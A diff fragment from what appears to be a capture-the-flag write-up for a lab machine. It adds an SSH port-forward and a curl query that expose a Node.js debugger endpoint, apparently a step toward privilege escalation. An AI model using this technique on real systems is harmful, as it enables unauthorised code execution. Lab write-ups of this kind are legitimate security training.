@@ -165,3 +165,20 @@ node        2359  0.0  0.2  18012 10736 ?        S    01:24   0:00 python3 -c im
 node        2360  0.0  0.1   8664  5592 pts/0    Ss   01:24   0:00 /bin/bash
 engineer    2463  0.0  0.0   6544  2280 pts/0    S+   01:35   0:00 grep --color=auto node
 ```
+
+```
+ssh -L 9229:127.0.0.1:9229 engineer@reactor.htb
+
+ajdev@rootbox:~$ curl http://127.0.0.1:9229/json
+[ {
+  "description": "node.js instance",
+  "devtoolsFrontendUrl": "devtools://devtools/bundled/js_app.html?experiments=true&v8only=true&ws=127.0.0.1:9229/51b7a786-9dfd-452a-b174-e9041eb35ee7",
+  "devtoolsFrontendUrlCompat": "devtools://devtools/bundled/inspector.html?experiments=true&v8only=true&ws=127.0.0.1:9229/51b7a786-9dfd-452a-b174-e9041eb35ee7",
+  "faviconUrl": "https://nodejs.org/static/images/favicons/favicon.ico",
+  "id": "51b7a786-9dfd-452a-b174-e9041eb35ee7",
+  "title": "/opt/uptime-monitor/worker.js",
+  "type": "node",
+  "url": "file:///opt/uptime-monitor/worker.js",
+  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/51b7a786-9dfd-452a-b174-e9041eb35ee7"
+} ]
+```
